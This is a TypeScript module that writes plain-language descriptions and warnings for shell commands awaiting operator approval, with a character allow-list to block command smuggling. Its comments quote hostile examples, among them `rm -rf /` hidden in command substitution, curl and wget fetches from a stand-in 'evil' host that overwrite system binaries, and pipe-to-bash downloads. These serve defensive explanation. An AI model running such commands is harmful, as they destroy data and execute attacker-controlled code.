import { parseShell, type ShellStage } from './parse-shell';
import {
  IRREVERSIBLE_TEXT,
  MAX_HEADLINE,
  READ_ONLY_REASSURANCE,
  type PlainDescription,
  unknownDescription,
} from './types';

export interface BashIntel {
  intent?: string;
  risk_score?: number;
  reversible?: boolean;
  validations?: Array<{ check?: string; reason?: string }>;
}

interface Clause {
  text: string;
  warnings: string[];
  ruleId: string;
}

const MAX_OPERAND = 80;

/**
 * The read-rule's reassurance. It travels through the clause pipeline as a
 * warning so the calm-eligibility filter below can strip it when it is not
 * the whole story; describeAction splits it into `reassurance` at the very
 * end, once that filter has had its say.
 */
const READ_ONLY_WARNING = READ_ONLY_REASSURANCE;

/** Code runs that the operator has not seen. Fixed phrases, never built from command text. */
const UNSEEN_CODE_WARNING = 'You are approving code that nobody has read.';
const UNSEEN_SCRIPT_WARNING = "I can't see what is inside that script.";
const DOWNLOAD_WRITE_WARNING =
  'This saves a file onto your computer at a path the command chose. It can overwrite something you rely on.';
const REMOTE_DELETE_WARNING = 'Work other people pushed can be lost.';
const TRUNCATED_CHAIN_WARNING =
  'This command has more steps than I can list here. Read the full command below before approving.';

/**
 * The only characters a command may contain and still be called harmless.
 *
 * This is an ALLOW-list, deliberately, rather than a deny-list of dangerous
 * sequences. "Is this binary read-only?" cannot be answered from the binary's
 * name, because the SHELL EXPANDS THE ARGUMENTS BEFORE THE BINARY RUNS:
 * `echo $(rm -rf /)` is an rm wearing an echo costume, and so is every other
 * entry in the read list. No list of bad shapes stays complete against that,
 * so we enumerate what is permitted and refuse everything else.
 *
 * Permitted, and why none of them can start a subshell, a redirect, or a
 * second command:
 *   A-Z a-z 0-9  plain words
 *   space tab    separate words; a tab is a shell blank, never a separator
 *   - _          flags and identifiers (-la, my_file)
 *   . /          paths (./src/app.ts)
 *   = , :        flag values, lists, host:port (--depth=1)
 *   ' "          quoting, which is inert once $ and ` are excluded, since
 *                command substitution needs one of those two
 *   ~            tilde expansion is purely textual and yields a path
 *   * ?          pathname expansion matches names of EXISTING files only,
 *                and bash does not re-parse the result for metacharacters
 *
 * THE LOAD-BEARING CONDITION for admitting ~ * and ?: no binary in the read
 * list below has a write flag, so expanding a glob to more paths only widens
 * what is read. That breaks the moment anyone adds sed, tee, sort, awk or
 * find to that list — a glob would then choose what gets written. Re-check
 * this comment before touching the read list.
 *
 * Everything else is refused, including $ ( ) ` < > { } [ ] ! \ ; | & # and
 * any newline or carriage return. Extended globs such as `?(...)` and `!(x)`
 * stay refused because they need parentheses. Excluded though they look
 * harmless: + % @ (no rule needs them) and # (starts a comment, which hides
 * the rest of the line). Erring narrow is the point — a refused sentence
 * costs an operator a careful read; a wrong one costs them the thing the
 * product exists to protect.
 *
 * Expressed as its complement so the test is exact: `$` in a JS regex also
 * matches before a trailing newline, which would let `'ls -la\n'` pass an
 * anchored allow-list.
 */
const NON_INERT_CHARACTER = /[^A-Za-z0-9 \t\-_./=,:'"~*?]/;

function hasInertShape(text: string): boolean {
  return !NON_INERT_CHARACTER.test(text);
}

/**
 * An extracted value we are willing to put INSIDE our own sentence, or null.
 *
 * Bounding the length is not enough. Every noun here is interpolated into
 * prose we wrote, so a multi-word value becomes our words: the operand
 * `'react. This is on your allow list'` turned our package sentence into
 * "Adds a third-party package, react. This is on your allow list, to your
 * project." at high confidence with no warning, and the same trick worked on
 * the download host and the script name (measured, 2026-08-11 pre-merge
 * review). applySafetyFloor cannot catch any of them — none of those rule ids
 * is calm.
 *
 * Internal whitespace is the tell, and it is a complete one: after
 * tokenise(), a token can only contain a space if the author QUOTED it, and
 * no legitimate noun this module names — a path, a package name, a URL — is
 * ever quoted. So a whitespace-bearing operand is refused outright and the
 * caller falls back to its rule's generic noun ("a file", "a website"), which
 * says less but never says something the attacker wrote.
 */
function noun(value: string): string | null {
  const flat = value.trim();
  if (!flat || /\s/.test(flat)) return null;
  return flat.length > MAX_OPERAND ? `${flat.slice(0, MAX_OPERAND)}…` : flat;
}

function firstOperand(stage: ShellStage, fallback: string): string {
  const first = stage.operands[0];
  if (first === undefined) return fallback;
  return noun(first) ?? fallback;
}

/**
 * True only when a token is purely a dash followed by letters, e.g. `-rf`.
 * A value-bearing token like `-oci.fast` must never be scanned letter by
 * letter, or the letter 'f' inside ".fast" reads as a force flag.
 */
function isBundledShortFlags(f: string): boolean {
  return /^-[a-zA-Z]+$/.test(f);
}

function hasFlag(stage: ShellStage, ...names: string[]): boolean {
  return stage.flags.some((f) => {
    if (names.includes(f)) return true;
    // A long flag can carry its value attached: --force-with-lease=refs/heads/main.
    if (names.some((n) => n.startsWith('--') && f.startsWith(`${n}=`))) return true;
    if (!isBundledShortFlags(f)) return false;
    return names.some((n) => {
      const ch = n[1];
      return n.length === 2 && ch !== undefined && f.includes(ch);
    });
  });
}

/**
 * parse-shell.ts has no notion of redirection, so `>`/`>>` survive
 * tokenisation as ordinary token text — usually glued to its target with no
 * space (`>out.txt`, `>>/etc/passwd`), since splitting only happens on
 * whitespace. Matching on containment, not equality, catches every spacing
 * variant. A filename that legitimately contains '>' is vanishingly rare,
 * and reading it as a write is the safe direction to be wrong in.
 *
 * Scans flags AND operands: parse-shell routes any token starting with '-'
 * into flags, so a redirect glued to a short flag (`ls -la>out.txt`) arrives
 * as one flag token and an operand-only scan never sees it.
 *
 * @internal Exported only so this can be tested directly. No input reaches it
 * past the entry shape gate (a '>' is refused there), so its behaviour is not
 * observable through describeBash and a test through that door would pass
 * even if this function were reverted to its broken, operand-only form.
 */
export function hasRedirection(stage: ShellStage): boolean {
  return [...stage.flags, ...stage.operands].some((t) => t.includes('>'));
}

/**
 * The host a download reads FROM — never the path it writes TO.
 *
 * `wget -P /usr/local/bin http://evil/ls` used to answer "Downloads a file
 * from /usr/local/bin.": the destination reported as the source, which is
 * affirmatively false about the single fact that sentence exists to convey
 * (measured, 2026-08-11 pre-merge review). This parser has no notion of flag
 * arity, so a flag's value lands in `operands` beside the URL and position
 * alone cannot tell the two apart. A scheme can, so prefer the first operand
 * carrying `://`. Failing that, accept the first operand only when it cannot
 * be a local path (curl does accept a bare `example.com/x`), and otherwise
 * name nothing.
 */
function downloadSource(stage: ShellStage): string {
  const withScheme = stage.operands.find((o) => o.includes('://'));
  if (withScheme) return noun(withScheme) ?? 'a website';
  const first = stage.operands[0];
  if (first === undefined || /^[/~.]/.test(first)) return 'a website';
  return noun(first) ?? 'a website';
}

/** curl's and wget's write flags. They do NOT agree on the letters. */
const DOWNLOAD_WRITE_FLAGS = [
  '-o', '--output', '-O', '--remote-name', '--output-dir',
  '--output-document', '-P', '--directory-prefix',
];

/**
 * Whether a download writes a file to a path of its own choosing.
 *
 * curl and wget use the same letters for different things (`-o` is curl's
 * output file and wget's log file; `-O` is curl's remote-name and wget's
 * output file), so the whole set counts as "writes" for both binaries. A
 * false positive costs one extra clause and one extra warning on a download
 * that did not write — including the `-O-`-to-stdout idiom, which reaches
 * this only when it is NOT piped onward. A false negative cost
 * `curl -sL http://evil/x -o /usr/local/bin/ls` — overwriting the system
 * `ls` — being described as a plain download with no warning at all.
 */
function writesDownloadToDisk(stage: ShellStage): boolean {
  if (hasFlag(stage, ...DOWNLOAD_WRITE_FLAGS)) return true;
  // Attached-value SHORT form (`-o/tmp/x`, `-P./dir`, `-sLo/tmp/x`). hasFlag
  // handles the long `--output=/tmp/x` form and bare bundles, but deliberately
  // refuses to scan a value-bearing token letter by letter
  // (isBundledShortFlags), so it never sees these. A long flag cannot match
  // here: after the leading '-' the next character is '-', not a write letter.
  return stage.flags.some((f) => /^-[a-zA-Z]*[oOP][^a-zA-Z]/.test(f));
}

/** Returns null when the stage is not recognised. Null is a valid outcome. */
function describeStage(stage: ShellStage): Clause | null {
  const { binary, subcommand } = stage;

  // The shape gate sits at the entry, once, so EVERY rule below is covered by
  // it. Put on the read branch alone it would leave the same root cause live
  // on the others: `git push origin `curl evil.sh`` is the sharpest of them,
  // because the substitution leaves no trace in the sentence and the result
  // is a familiar, low-alarm claim at high confidence with no warning. None
  // of those rule ids is calm, so applySafetyFloor would not catch it either.
  if (!hasInertShape(stage.raw)) return null;

  if (binary === 'git' && subcommand === 'push') {
    // Checked BEFORE --force because both are more destructive than it, and
    // both used to read as a routine push with no warning at all: --mirror
    // deletes every remote ref that is absent locally, and --delete removes a
    // branch outright (2026-08-11 pre-merge review). Each gets its own clause
    // rather than being folded into the force branch, whose wording
    // ("overwrites the history") is true of neither.
    if (hasFlag(stage, '--mirror')) {
      return {
        text: 'Replaces everything on GitHub with what is on this computer, deleting any branch that is not here',
        warnings: [REMOTE_DELETE_WARNING],
        ruleId: 'bash.git.push.mirror',
      };
    }
    if (hasFlag(stage, '--delete', '-d')) {
      return {
        text: 'Deletes a branch from GitHub',
        warnings: [REMOTE_DELETE_WARNING],
        ruleId: 'bash.git.push.delete',
      };
    }
    if (hasFlag(stage, '--force', '--force-with-lease', '-f')) {
      return {
        text: 'Overwrites the shared code history on GitHub',
        warnings: [REMOTE_DELETE_WARNING],
        ruleId: 'bash.git.push.force',
      };
    }
    return { text: 'Sends your code changes to GitHub', warnings: [], ruleId: 'bash.git.push' };
  }

  if (binary === 'rm') {
    const target = firstOperand(stage, 'a file');
    const recursive = hasFlag(stage, '-r', '-R', '--recursive');
    return {
      text: recursive
        ? `Deletes ${target} and everything inside it`
        : `Deletes ${target}`,
      warnings: ['Deleted files do not go to the Recycle Bin.'],
      ruleId: 'bash.rm',
    };
  }

  if (binary === 'curl' || binary === 'wget') {
    const url = downloadSource(stage);
    if (writesDownloadToDisk(stage)) {
      return {
        text: `Downloads a file from ${url} and saves it onto your computer`,
        warnings: [DOWNLOAD_WRITE_WARNING],
        ruleId: 'bash.download.write',
      };
    }
    return { text: `Downloads a file from ${url}`, warnings: [], ruleId: 'bash.download' };
  }

  if (binary === 'bash' || binary === 'sh' || binary === 'zsh') {
    // A -c payload is the actual command. Without reading it, "Runs a
    // script" would be a confident sentence about nothing.
    if (hasFlag(stage, '-c')) return null;
    // Three distinct cases, and they must not collapse into each other: no
    // script named at all, a script we can safely name, and a script whose
    // name is not a name (see noun()). Only the first opens a shell.
    const scriptOperand = stage.operands[0];
    const script = scriptOperand !== undefined ? noun(scriptOperand) : null;
    return {
      // Naming the file is not the same as reading it: whatever is inside
      // runs with the operator's own authority, and nothing here shows it to
      // them. A bare interpreter with no script named is wider still.
      text: scriptOperand === undefined
        ? 'Opens a shell that can run any command'
        : script
          ? `Runs the script ${script}`
          : 'Runs a script',
      warnings: [UNSEEN_SCRIPT_WARNING],
      ruleId: 'bash.interpreter',
    };
  }

  if ((binary === 'npm' || binary === 'pnpm' || binary === 'yarn') && (subcommand === 'install' || subcommand === 'i' || subcommand === 'add')) {
    // As with the interpreter above: "no package named" (a lockfile install)
    // and "a package we will not repeat" are different facts, and saying the
    // first when the second is true would describe a different command.
    const pkgOperand = stage.operands[0];
    const pkg = pkgOperand !== undefined ? noun(pkgOperand) : null;
    return {
      text: pkgOperand === undefined
        ? "Installs the project's third-party packages"
        : pkg
          ? `Adds a third-party package, ${pkg}, to your project`
          : 'Adds a third-party package to your project',
      warnings: [],
      ruleId: 'bash.package.install',
    };
  }

  if (binary === 'psql' || binary === 'mysql') {
    const sql = stage.operands.join(' ').toUpperCase();
    if (sql.includes('DROP TABLE')) {
      return { text: 'Permanently deletes a table from your database', warnings: [IRREVERSIBLE_TEXT], ruleId: 'bash.sql.drop' };
    }
    if (sql.includes('DELETE FROM')) {
      return { text: 'Deletes rows from your database', warnings: [IRREVERSIBLE_TEXT], ruleId: 'bash.sql.delete' };
    }
    return { text: 'Runs a command against your database', warnings: [], ruleId: 'bash.sql' };
  }

  // NOTHING IN THIS LIST MAY HAVE A WRITE FLAG. The allow-list admits the
  // glob characters * and ? on exactly that condition — see the LOAD-BEARING
  // CONDITION note on NON_INERT_CHARACTER before adding sed, tee, sort, awk
  // or find here. `find` is deliberately absent already: it takes -delete and
  // -exec, so it is not read-only and we cannot cheaply prove otherwise.
  if (['ls', 'cat', 'pwd', 'head', 'tail', 'wc', 'which', 'echo', 'grep'].includes(binary)) {
    // Redundant against the entry shape gate (a '>' is already refused), and
    // kept anyway as the narrower, independently correct guard: if the shape
    // gate is ever relaxed, redirection coverage must not vanish with it.
    if (hasRedirection(stage)) return null;
    return { text: 'Reads information from your computer', warnings: [READ_ONLY_WARNING], ruleId: 'bash.read' };
  }

  return null;
}

/**
 * True when this stage is a shell that takes its script from whatever is fed
 * into it: a bare `bash`, or an explicit `bash -s`. `bash deploy.sh` runs a
 * named file and `bash -c '...'` runs an inline payload, so neither of those
 * is fed by the step before it and neither may be paired with one.
 */
function readsScriptFromPipe(stage: ShellStage): boolean {
  if (!['bash', 'sh', 'zsh'].includes(stage.binary)) return false;
  if (hasFlag(stage, '-c')) return false;
  return stage.operands.length === 0 || hasFlag(stage, '-s');
}

/**
 * Piping into a shell is materially different from either half: the operator
 * never sees the code that runs. That hazard is identical whether the code
 * arrives from the network (`curl x.sh | bash`) or off the disk
 * (`cat payload.sh | bash`), so both get a sentence about running unseen
 * code and a warning — never a sentence that opens with the word "Reads".
 *
 * `source` is the stage feeding the shell, never `stages[0]`, so the sentence
 * names what actually runs rather than whatever happened to run first.
 *
 * Returns null unless the source stage's whole job is to emit bytes, because
 * a pair collapses two stages into ONE clause and drops the source's own
 * sentence and warnings. That is only truthful when the source's output IS
 * the script: a downloader, or the read family (`cat payload.sh`, `echo ...`).
 * For anything else — `rm -rf build/ ; bash` — pairing would delete the
 * deletion from the sentence, so the caller describes both stages separately
 * instead. An unrecognised source returns null for the same reason plus one
 * more: counting it as understood would inflate confidence to high.
 */
function describePipeToShell(source: ShellStage): Clause | null {
  // The same entry gate describeStage applies, for the same reason — and it
  // has to be repeated here because the download branch below never goes
  // through describeStage. Without it, `curl -sL $(rm -rf /) | bash` answered
  // "Downloads a script from $(rm and runs it straight away" at HIGH
  // confidence: a substitution rendered as a hostname (measured, 2026-08-11
  // pre-merge review). The `.local` branch is covered either way, since it
  // asks describeStage for the source's rule id.
  if (!hasInertShape(source.raw)) return null;

  if (source.binary === 'curl' || source.binary === 'wget') {
    const from = downloadSource(source);
    return {
      text: `Downloads a script from ${from} and runs it straight away, without showing it to you`,
      warnings: ['Whoever controls that website chooses what runs.'],
      ruleId: 'bash.pipe-to-shell',
    };
  }
  if (describeStage(source)?.ruleId !== 'bash.read') return null;
  const from = firstOperand(source, '');
  return {
    text: from
      ? `Runs code from ${from} straight away, without showing it to you`
      : 'Runs code from the step before it, without showing it to you',
    warnings: [UNSEEN_CODE_WARNING],
    ruleId: 'bash.pipe-to-shell.local',
  };
}

/**
 * Walks every stage once, in order. A script-producing stage immediately
 * followed by a shell that reads its script from the pipe is consumed as one
 * pair and produces a single combined clause (see describePipeToShell for
 * which sources qualify and why the set is narrow); every other stage is
 * described on its own. This keeps every stage accounted for — no
 * short-circuit ever discards the rest of the pipeline the way a pre-check
 * over the whole command would.
 *
 * `stagesUnderstood` counts input stages, not output clauses (a pair counts
 * as two), so completeness stays a true count of the whole command.
 */
function describeStages(stages: ShellStage[]): { clauses: Clause[]; complete: boolean } {
  const clauses: Clause[] = [];
  let stagesUnderstood = 0;
  let i = 0;
  while (i < stages.length) {
    const stage = stages[i];
    if (!stage) break;
    const next = stages[i + 1];
    const paired = next && readsScriptFromPipe(next) ? describePipeToShell(stage) : null;
    if (paired) {
      clauses.push(paired);
      stagesUnderstood += 2;
      i += 2;
      continue;
    }
    const clause = describeStage(stage);
    if (clause) {
      clauses.push(clause);
      stagesUnderstood += 1;
    }
    i += 1;
  }
  return { clauses, complete: stagesUnderstood === stages.length };
}

/**
 * Every clause text is written to open a sentence, so joining them left them
 * capitalised mid-sentence: "…, then Deletes build/ and everything inside
 * it." Lowercasing the first letter of each later clause is safe precisely
 * because those texts are ours and every one of them starts with a verb —
 * no clause opens with a proper noun or an extracted value.
 */
function lowerFirst(text: string): string {
  return text ? `${text[0]?.toLowerCase() ?? ''}${text.slice(1)}` : text;
}

/**
 * Collapse a run of identical consecutive clauses into one, counted.
 *
 * A chain of seven listings and greps composed "Reads information from your
 * computer, then reads information from your computer, then …" — one sentence
 * said seven times, which reads as a stutter and buries the step that is
 * actually different (reported from the approvals queue, 2026-08-11). The run
 * is stated once with how many times it happens instead.
 *
 * Only CONSECUTIVE clauses collapse, and only when the same rule produced the
 * same sentence: in `ls; rm -rf build/; ls` the repetition IS the sequence, so
 * both reads stay listed in order. Nothing is dropped and nothing is hidden —
 * the count stands for every stage in the run, so joinClauses still reports
 * only the steps the operator was genuinely not shown.
 */
function collapseRuns(clauses: Clause[]): Clause[] {
  const runs: Array<{ clause: Clause; repeats: number }> = [];
  for (const clause of clauses) {
    const last = runs[runs.length - 1];
    if (last && last.clause.ruleId === clause.ruleId && last.clause.text === clause.text) {
      last.repeats += 1;
      // Identical text from an identical rule carries identical warnings
      // today. Merging rather than keeping the first means a future rule that
      // varies them cannot lose one silently.
      last.clause.warnings = [...new Set([...last.clause.warnings, ...clause.warnings])];
      continue;
    }
    runs.push({ clause: { ...clause, warnings: [...clause.warnings] }, repeats: 1 });
  }
  return runs.map(({ clause, repeats }) =>
    repeats > 1 ? { ...clause, text: `${clause.text} ${repeats} times` } : clause,
  );
}

/** Room kept back for the ", and 120 more steps" tail. */
const MORE_STEPS_RESERVE = 40;

/**
 * Join as many clauses as fit inside the headline budget, and report how many
 * were left out so the caller can say so out loud.
 *
 * A pipeline has no bound on its stage count, and the headline had none
 * either: 120 stages composed a 5034-character sentence that exceeded both
 * the Telegram and Discord limits, so the operator got no notification at all
 * (see MAX_HEADLINE). Truncating mid-clause would have been worse than long —
 * the first clause is therefore always kept whole, even if it alone overruns,
 * and clampHeadline is the backstop for that degenerate case.
 */
function joinClauses(clauses: Clause[]): { text: string; omitted: number } {
  const budget = MAX_HEADLINE - MORE_STEPS_RESERVE;
  let text = '';
  let used = 0;
  for (const clause of clauses) {
    if (used === 0) {
      text = clause.text;
    } else {
      const piece = `, then ${lowerFirst(clause.text)}`;
      if (text.length + piece.length > budget) break;
      text += piece;
    }
    used += 1;
  }
  return { text, omitted: clauses.length - used };
}

export function describeBash(command: string, bashIntel?: BashIntel): PlainDescription {
  const stages = parseShell(command);
  if (stages.length === 0) return unknownDescription('bash.empty');

  // The classifier is the only source of reversibility. Absent means unknown,
  // never true — a missing signal must not read as reassurance.
  const reversible: boolean | 'unknown' =
    typeof bashIntel?.reversible === 'boolean' ? bashIntel.reversible : 'unknown';

  const { clauses: parsed, complete } = describeStages(stages);
  if (parsed.length === 0) return unknownDescription('bash.unrecognised');

  // Collapsed before anything counts clauses, so "one clause" below means
  // "one thing this command does", not "one stage". `complete` is unaffected:
  // it is decided by how many stages were understood, and a run is only
  // collapsed once every stage in it has been.
  const known = collapseRuns(parsed);

  // A mixed OR incompletely-understood pipeline is never calm, even when the
  // one stage we did recognise is a read: "one clause was recognised" is not
  // "the whole command was understood". Folding `complete` into soleClause
  // keeps its two consumers below from drifting apart, as they did in round 3.
  const soleClause = complete && known.length === 1 ? known[0] : undefined;

  // Deliberately NOT also gated on the shape of the whole raw command. For
  // soleClause to exist there must be exactly one recognised stage AND the
  // command must be complete, so the only text outside that stage is
  // separators and whitespace — never a payload. A whole-command gate here
  // could therefore never prevent a lie, and it did active harm: a trailing
  // separator (`ls -la;`, `ls -la\n`) pushed a still-calm headline onto the
  // non-calm id bash.sequence, which BLINDED applySafetyFloor, since the
  // floor only polices CALM_RULE_IDS. The per-stage gate at describeStage's
  // entry does the safety work; this keeps the calm id so the floor can fire.
  const calmEligible = soleClause !== undefined;

  const { text, omitted } = joinClauses(known);
  const warnings = [...new Set(known.flatMap((c) => c.warnings))]
    // "Reads only, changes nothing." is an unsupportable claim unless the
    // whole command was understood and IS that one read — otherwise it is
    // either reassurance about a stage we just admitted we can't read, or it
    // reads calmest-first next to a warning from a more dangerous clause.
    .filter((w) => calmEligible || w !== READ_ONLY_WARNING);

  // Read but not shown is still not shown. Ordered after the unreadable
  // warning below so "I can't read part of this" stays first.
  if (omitted > 0) warnings.unshift(TRUNCATED_CHAIN_WARNING);
  if (!complete) {
    warnings.unshift("There is more in this command that I can't read. Check it below before approving.");
  }

  // Same single condition as calmEligible, so the two cannot drift apart.
  // soleClause requires exactly one recognised clause, so a headline that had
  // to drop clauses can never carry a calm rule id.
  const ruleId = soleClause !== undefined ? soleClause.ruleId : complete ? 'bash.sequence' : 'bash.partial';

  const listed = omitted > 0 ? `${text}, and ${omitted} more steps.` : `${text}.`;

  return {
    headline: complete ? listed : `${listed} There is more here I can't read.`,
    warnings,
    // A step we parsed but could not fit on the card is a step the operator
    // cannot see, so this is not a "high" answer even though nothing failed
    // to parse.
    confidence: complete && omitted === 0 ? 'high' : 'partial',
    reversible,
    ruleId,
  };
}
